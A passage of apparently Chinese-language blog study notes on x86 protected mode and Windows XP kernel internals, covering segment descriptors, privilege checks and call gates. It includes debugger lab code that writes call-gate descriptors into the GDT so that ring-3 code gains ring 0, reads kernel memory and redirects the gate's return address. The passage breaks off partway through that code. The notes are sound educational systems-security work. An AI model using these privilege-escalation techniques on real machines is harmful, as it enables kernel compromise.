class="headerlink" title="练习：从GTD表中查找对应的段描述符，然后填充到段寄存器中。"></a>练习：从GTD表中查找对应的段描述符，然后填充到段寄存器中。</h2><p>段选择子：23 2B 30 3B 53</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">23：0010 0011</span><br><span class="line">index:4</span><br><span class="line">00cff300`0000ffff</span><br><span class="line">WORD Selector: 23</span><br><span class="line">WORD Atrribute: cff3</span><br><span class="line">DWORD Base: 00000000</span><br><span class="line">DWORD Limit: ffffffff</span><br><span class="line"></span><br><span class="line">2B：0010 1011</span><br><span class="line">index:5</span><br><span class="line">80008b04`200020ab</span><br><span class="line">WORD Selector: 2B</span><br><span class="line">WORD Atrribute: 008b</span><br><span class="line">DWORD Base: 80042000</span><br><span class="line">DWORD Limit:000020ab</span><br><span class="line"></span><br><span class="line">30：0011 0000</span><br><span class="line">index:6</span><br><span class="line">ffc093df`f0000001</span><br><span class="line">WORD Selector: 30</span><br><span class="line">WORD Atrribute: c093</span><br><span class="line">DWORD Base: ffdff000</span><br><span class="line">DWORD Limit: 00001fff</span><br><span class="line"></span><br><span class="line">3B：0011 1011</span><br><span class="line">index:7</span><br><span class="line">0040f300`00000fff</span><br><span class="line">WORD Selector: 3B</span><br><span class="line">WORD Atrribute: 40f3</span><br><span class="line">DWORD Base: 00000000</span><br><span class="line">DWORD Limit: 00000fff</span><br><span class="line"></span><br><span class="line">53：0101 0011</span><br><span class="line">index:A</span><br><span class="line">80008954`af000068</span><br><span class="line">WORD Selector: 53</span><br><span class="line">WORD Atrribute: 0089</span><br><span class="line">DWORD Base: 8054af00</span><br><span class="line">DWORD Limit: 00000068</span><br></pre></td></tr></table></figure><h1 id="006-段描述符属性：S位和TYPE域"><a href="#006-段描述符属性：S位和TYPE域" class="headerlink" title="006.段描述符属性：S位和TYPE域"></a>006.段描述符属性：S位和TYPE域</h1><p>S&#x3D;1：代码段或者数据段描述符</p><p>S&#x3D;0：系统段描述符</p><p>DPL只有两种情况，00和11</p><p>也就是说只有第五位为9或者F时这里是代码段或者数据段，否则不是：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220409170300022.png"></p><p>当type第11位为0时是数据段，1时是代码段：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220409170426468.png"></p><p>A：是否被访问过</p><p>W：是否可写</p><p>E：向下扩展位，</p><p>R：是否可读</p><p>C：一致位</p><p>上面是当S&#x3D;1的情况，下面是S&#x3D;0，也就是系统段描述符的情况：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220409171001033.png"></p><h1 id="007-段描述符属性：DB位"><a href="#007-段描述符属性：DB位" class="headerlink" title="007.段描述符属性：DB位"></a>007.段描述符属性：DB位</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">情况一︰对CS段的影响</span><br><span class="line">    D=1:采用32位寻址方式</span><br><span class="line">    D=0:采用16位寻址方式</span><br><span class="line">    前缀67：改变寻址方式（见下图）</span><br><span class="line">情况二:对SS段的影响</span><br><span class="line">    D=1:隐式堆栈访问指令(如:PUSH POP CALL）使用32位堆栈指针寄存器ESP</span><br><span class="line">    D=О:隐式堆栈访问指令(如:PUSH POP CALL）使用16位堆栈指针寄存器SP</span><br><span class="line">情况三:向下拓展的数据段</span><br><span class="line">    D=1:段上线为4GB</span><br><span class="line">    D=0:段上线为64KB</span><br><span class="line">    D=1:段上线为4GB</span><br><span class="line">    D=0:段上线为64KB</span><br></pre></td></tr></table></figure><p>32位寻址：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915160041371.png"></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926221836085.png"></p><h1 id="008-段权限检查"><a href="#008-段权限检查" class="headerlink" title="008.段权限检查"></a>008.段权限检查</h1><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926221851332.png"></p><p>&#x3D;&#x3D;如何查看程序是哪一环：CPL（当前特权级）&#x3D;&#x3D;</p><p>&#x3D;&#x3D;CS和SS中存储的段选择子的后2位&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//这种就是0 环</span><br><span class="line">0: kd&gt; r</span><br><span class="line">rax=000000000000df01 rbx=fffff80230fa6180 rcx=0000000000000001</span><br><span class="line">rdx=0000002500000000 rsi=0000000000000001 rdi=ffffc009d5bf0040</span><br><span class="line">rip=fffff80231dc00a0 rsp=fffff80234081b78 rbp=0000000000000000</span><br><span class="line"> r8=000000000000014a  r9=ffffc009d18a1000 r10=00000000000000a4</span><br><span class="line">r11=fffff80234081c08 r12=000000256c72b900 r13=0000000000000000</span><br><span class="line">r14=fffff78000000300 r15=0000000000000001</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff802`31dc00a0 cc              int     3</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//这种就是3环</span><br><span class="line">0:000&gt; r</span><br><span class="line">rax=0000000000000000 rbx=0000000000000010 rcx=00007ffb95e4d214</span><br><span class="line">rdx=0000000000000000 rsi=00007ffb95ee1a90 rdi=0000006091902000</span><br><span class="line">rip=00007ffb95e806b0 rsp=0000006091a7f2a0 rbp=0000000000000000</span><br><span class="line"> r8=0000006091a7f298  r9=0000000000000000 r10=0000000000000000</span><br><span class="line">r11=0000000000000246 r12=0000000000000040 r13=0000000000000000</span><br><span class="line">r14=00007ffb95ed48f0 r15=00000202241a0000</span><br><span class="line">iopl=0         nv up ei pl zr na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x30:</span><br><span class="line">00007ffb`95e806b0 cc              int     3</span><br></pre></td></tr></table></figure><p>CPL：CPU当前的权限级别(当前程序)<br>DPL：(Descriptor Privilege Level:描述符特权级别)如果你想访问我，你应该具备什么样的权限，描述符特权级<br>RPL ：用什么权限去访问一企段，请求特权级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参考如下代码:</span><br><span class="line">比如当前程序处于0环，也就是说CPL=O</span><br><span class="line">Mov ax,00OB //1011 RPL = 3</span><br><span class="line">Mov ds,ax   //ax指向的段描述符的DPL=0</span><br><span class="line"></span><br><span class="line">数据段的权限检查:</span><br><span class="line">CPL&lt;= DPL 并且 RPL&lt;= DPL(数值上的比较)</span><br><span class="line">注意:</span><br><span class="line">代码段和系统段描述符中的检查方式并不一样,具体参加后面课程.</span><br></pre></td></tr></table></figure><h1 id="009-代码跨段跳转流程"><a href="#009-代码跨段跳转流程" class="headerlink" title="009.代码跨段跳转流程"></a>009.代码跨段跳转流程</h1><p><strong>代码跨段本质就是修改CS段寄存器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1、代码间的跳转(段间跳转非调用门之类的)</span><br><span class="line"></span><br><span class="line">段间跳转，有2种情况，即要跳转的段是一致代码段还是非一致代码段(如何区分参见之前视频)</span><br><span class="line"></span><br><span class="line">同时修改CS与EIP的指令</span><br><span class="line">JMP FAR/CALL FAR/RETF /INT/IRETED</span><br><span class="line">注意:</span><br><span class="line">只改变EIP的指令</span><br><span class="line">JMP / CALL /JcC/RET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、代码间的跳转(段间跳转非调用门之类的)执行流程:</span><br><span class="line">JMP 0x20:0x004183D7 CPU如何执行这行代码?</span><br><span class="line">    (1)段选择子拆分</span><br><span class="line">        Ox20对应二进制形式0000 0000 0010 0000</span><br><span class="line">        RPL= 00</span><br><span class="line">        TI=0</span><br><span class="line">        lndex = 4</span><br><span class="line">    (2)查表得到段描述符</span><br><span class="line">        TI=0 所以查GDT表</span><br><span class="line">        Index=4 找到对应的段描述符</span><br><span class="line">        四种情况可以跳转:代码段、调用门、TSS任务段、任务门</span><br><span class="line">    (3)权限检查</span><br><span class="line">    如果是非一致代码段，要求:CPL == DPL并且RPL&lt;= DPL</span><br><span class="line">    如果是一致代码段，要求:CPL &gt;= DPL</span><br><span class="line">    (4)加载段描述符</span><br><span class="line">    通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中.</span><br><span class="line">    (5)代码执行</span><br><span class="line">        CPU将CS.Base + Offset的值写入EIP然后执行CS:EIP处的代码，段间跳转结束.</span><br><span class="line">6、总结:</span><br><span class="line">对于一致代码段:也就是共享的段</span><br><span class="line">特权级高的程序不允许访问特权级低的数据:O核心态不允许访问用户态的数据</span><br><span class="line">特权级低的程序可以访问到特权级高的数据，但特权级不会改变:用户态还是用户态</span><br><span class="line">对于普通代码段:也就是非一致代码段</span><br><span class="line">只允许同级访问</span><br><span class="line">绝对禁止不同级别的访问:核心态不是用户态，用户态也不是核心态.</span><br></pre></td></tr></table></figure><p>直接对代码段进行JMP或者CALL的操作，无论目标是一致代码段还是非一致代码段，CPL都不会发生改变.如果要提升CPL的权限，只能通过调用门.</p><h1 id="010-代码跨段跳转实验"><a href="#010-代码跨段跳转实验" class="headerlink" title="010.代码跨段跳转实验"></a>010.代码跨段跳转实验</h1><p>1.构造段描述符</p><p>​找一个非一致代码段描述符，复制一份，写入到GDT表中</p><p>将上面的那个写到下面空的地方：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915163111192.png"></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220705205746223.png"></p><p>在od中：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915163545870.png"></p><p>执行后，ip和cs都会改变，成功执行：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915163613567.png"></p><p>下面修改段描述符的权限级别DPL，为00cf9b00&#96;0000ffff，在od中跳转的内容不变，执行后会发现。跳转不成功，权限检查错误，跳到了ntdll里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; eq 8003f048 00cf9b00`0000ffff</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915164138159.png"></p><p>上面是非一致代码段，下面将该段描述符改为一致代码段(允许低权限执行)，改为00cf9f00xxxxxx，                                                                                              成功跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; eq 8003f048 00cf9f00`0000ffff</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915164331943.png"></p><p>总结:</p><p>1、为了对数据进行保护，普通代码段是禁止不同级别进行访问的。用户态的代码不能访问内核的数据，同样，内核态的代码也不能访问用户态的数据.<br>2、如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段，这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问.<br>3、如果想访问普通代码段，只有通过“调用门”等提示CPL权限，才能访问。</p><h1 id="额外：双机调试"><a href="#额外：双机调试" class="headerlink" title="额外：双机调试"></a>额外：双机调试</h1><p><strong>从这里开始换调试环境了，换成winxp32位了。</strong></p><p>改boot.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=30</span><br><span class="line">default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect /debug /debugport=com1 /baudrate=115200</span><br></pre></td></tr></table></figure><p>添加串行端口：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915154318677.png"></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915154357463.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Windows Kits\10\Debuggers\x86&gt;windbg.exe -b -k com:port=\\.\pipe\com_1,baud=115200,pipe</span><br></pre></td></tr></table></figure><h1 id="011-长调用与短调用"><a href="#011-长调用与短调用" class="headerlink" title="011.长调用与短调用"></a>011.长调用与短调用</h1><p>短调用就是我们在汇编常见的<code>CALL</code>指令，<code>call</code>后会将EIP压栈。</p><p>长调用分为两种，一种提权，一种不提权，调用格式为：指令格式：<code>CALL CS:EIP</code>，其中<code>EIP</code>是废弃的，<code>CS</code>为指向<code>调用门</code>的段选择子。</p><p>通过<strong>JMP FAR</strong>可以实现段间的跳转如果要实现跨段的调用就必须要<strong>CALL FAR</strong>，也就是长调用.<br><strong>CALL FAR</strong>比<strong>JMP FAR</strong>要复杂，<code>JMP</code>并不影响堆栈,但<code>CALL</code>指令会影响.</p><ol><li><p>短调用：</p><p>指令格式：<code>call 立即数/寄存器/内存</code></p><p>CALL的时候会将下一行代码的地址压入栈，call后eip与esp都会变。</p><p>ret 的时候会将写入的地址写入eip，esp也会变。</p></li><li><p>长调用（跨段不提权）</p><p>指令格式：<code>call cs:eip(eip是废弃的)</code></p><p>发生改变的寄存器有<code>ESP</code>、<code>EIP</code>和<code>CS</code>，比段调用多了一个<code>CS</code></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926211210422.png"></p></li><li><p>长调用（跨段并提权）</p><p>指令格式：<code>call cs:eip(eip是废弃的)</code></p><p>发生改变的寄存器有<code>ESP</code>、<code>EIP</code>、<code>CS</code>和&#96;SS。</p></li></ol><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915170010817.png"><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915170021012.png"></p><p>5、总结：</p><ol><li>跨段调用时，一旦有权限切换，就会切换堆栈.</li><li>CS的权限一旦改变，SS的权限也要随着改变，CS与SS的等级必须一样.</li><li><code>JMP FAR</code> 只能跳转到同级非一致代码段，但<code>CALL FAR</code>可以通过调用门提权，提升CPL的权限.</li></ol><h1 id="012-调用门-无参"><a href="#012-调用门-无参" class="headerlink" title="012.调用门(无参)"></a>012.调用门(无参)</h1><p>win无调用门但是可以手写</p><p>p位：12bit&#x3D;0：系统描述符</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916164814247.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调用门执行流程</span><br><span class="line"></span><br><span class="line">指令格式：CALL  CS:EIP(EIP是废弃的)</span><br><span class="line">执行步骤：</span><br><span class="line">1) 根据CS的值 查GDT表，找到对应的段描述符  这个描述符是一个调用门.</span><br><span class="line">2) 在调用门描述符中存储另一个代码段段的选择子.</span><br><span class="line">3) 选择子指向的段  段.Base + 偏移地址 就是真正要执行的地址.</span><br></pre></td></tr></table></figure><p>可以在0x48的位置写，这个位置没有被用到，防止蓝屏。</p><h2 id="调用门提权"><a href="#调用门提权" class="headerlink" title="调用门提权"></a>调用门提权</h2><p>构造一个调用门描述符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000 EC00 0008 0000</span><br></pre></td></tr></table></figure><p>写到gdt表：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916232442504.png"></p><p>观察堆栈和寄存器变化：</p><p>找到地址：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916233410021.png"></p><p>这时的寄存器：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916233912720.png"></p><p>所以说要改调用门为：<code>0040EC00 00081020</code></p><p>发生中断后，中断到了0环调试器：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916233949926.png"></p><p>可以看到cs和eip还有esp都发生了变化，成功提权，这时已经是0环权限了。</p><p>并且新的栈中，压入了原来esp和cs等内容。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916234159283.png"></p><h2 id="读高2G内存"><a href="#读高2G内存" class="headerlink" title="读高2G内存"></a>读高2G内存</h2><p>地址没变，所以gdt表的内容没改。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916235233228.png"><br><code>sgdt</code>指令是用来读取<code>GDTR</code>这个寄存器的，3环也可以做到(ret就行)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">sgdt GDT</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="013-调用门-有参"><a href="#013-调用门-有参" class="headerlink" title="013.调用门(有参 )"></a>013.调用门(有参 )</h1><p>调用门描述符和上节还是一样，如果有参数的话如下：<code>0000 EC03 0008 0000(3个参数)</code></p><p>这时的堆栈：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917094545158.png"></p><p>跟上一节一样，该gdtr</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917100052830.png"></p><p>测试代码及结果</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220917100007067.png"></p><h2 id="调用门总结"><a href="#调用门总结" class="headerlink" title="调用门总结"></a>调用门总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1) 当通过门，权限不变的时候，只会PUSH两个值：CS  返回地址</span><br><span class="line">新的CS的值由调用门决定</span><br><span class="line"></span><br><span class="line">2) 当通过门，权限改变的时候，会PUSH四个值：SS、ESP、CS、返回地址   </span><br><span class="line">新的CS的值由调用门决定  </span><br><span class="line">新的SS和ESP由TSS提供</span><br><span class="line"></span><br><span class="line">3) 通过门调用时，要执行哪行代码有调用门决定，但使用RETF返回时，由堆栈中压人的值决定，这就是说，进门时只能按指定路线走，出门时可以翻墙(只要改变堆栈里面的值就可以想去哪去哪)</span><br><span class="line">4) 可不可以再建个门出去呢?也就是用Call  当然可以了 前门进 后门出</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="调用门阶段测试"><a href="#调用门阶段测试" class="headerlink" title="调用门阶段测试"></a>调用门阶段测试</h2><h3 id="Test1"><a href="#Test1" class="headerlink" title="Test1"></a>Test1</h3><p>构造调用门，实现R3读高2G内存</p><p>还是上面的，注意构造的调用门描述符</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220916235233228.png"></p><h3 id="Test2"><a href="#Test2" class="headerlink" title="Test2"></a>Test2</h3><p>在第一题的基础上进行修改，实现通过fq的方式返回到其他地址</p><p>意思就是不走原来的RETF，而知修改栈里面的ret地址，跳到其他地址执行。</p><p>注意修改返回地址</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926204910845.png"></p><h3 id="Test3"><a href="#Test3" class="headerlink" title="Test3"></a>Test3</h3><p>在第一题的基础上进行修改，在门中再建一个门跳转到其他地址</p><p>需要注意，从第一个函数跳到第二个函数时，调用门中的DPL要设置成0，因为此时裸函数1的CPL&#x3D;0.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue; <span class="comment">// 高2G内存</span></span><br><span class="line">BOOL bFunctionHas0CPL1Called; <span class="comment">// 证明函数1被调用</span></span><br><span class="line">BOOL bFunctionHas0CPL2Called; <span class="comment">// 证明函数2被调用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> gate1[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;; <span class="comment">// 0041ec00`00081000</span></span><br><span class="line"><span class="keyword">char</span> gate2[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>,<span class="number">0</span>&#125;; <span class="comment">// 00418c00`00081020</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="comment">// 00401000</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL1()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"></span><br><span class="line">mov al,<span class="number">1</span></span><br><span class="line">mov byte ptr ds:[bFunctionHas0CPL1Called],al</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">mov eax,<span class="number">0x8003f008</span></span><br><span class="line">mov eax,[eax]</span><br><span class="line">mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">call fword ptr ds:[gate2]</span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line"></span><br><span class="line">retf<span class="comment">// 注意堆栈平衡，写错蓝屏</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 00401020</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL2()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"></span><br><span class="line">mov al,<span class="number">1</span></span><br><span class="line">mov byte ptr ds:[bFunctionHas0CPL2Called],al</span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">retf</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">call fword ptr ds:[gate1] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, bFunctionHas0CPL1Called,bFunctionHas0CPL2Called);</span><br><span 